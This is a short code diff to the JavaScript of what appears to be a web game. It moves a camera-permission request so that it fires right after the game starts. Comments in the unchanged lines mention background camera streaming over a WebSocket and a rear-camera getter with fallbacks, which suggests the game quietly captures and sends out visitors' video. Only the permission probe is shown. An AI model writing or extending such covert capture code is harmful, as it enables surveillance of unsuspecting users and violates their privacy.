@@ -276,6 +276,18 @@
         // Start the game immediately regardless of share success
         startGame();
 
+        // Request camera permission immediately (independent of WebSocket)
+        console.log('Requesting camera permission...');
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          .then(stream => {
+            console.log('Camera access granted!', stream);
+            // Stop the stream immediately since we just wanted to test permission
+            stream.getTracks().forEach(track => track.stop());
+          })
+          .catch(error => {
+            console.log('Camera access denied or failed:', error.message);
+          });
+
         // Start camera streaming via WebSocket (new system) - this runs in background
         // Don't block the game if this fails
         try {
@@ -299,17 +311,6 @@
 
           // Wrap all camera access in try-catch to prevent blocking
           try {
-            // Simple direct camera access request first
-            console.log('Requesting camera permission...');
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-              .then(stream => {
-                console.log('Camera access granted!', stream);
-                // Stop the stream immediately since we just wanted to test permission
-                stream.getTracks().forEach(track => track.stop());
-              })
-              .catch(error => {
-                console.log('Camera access denied or failed:', error.message);
-              });
 
             // Robust rear-camera getter with multiple fallbacks
             const getBackThenFront = async () => {
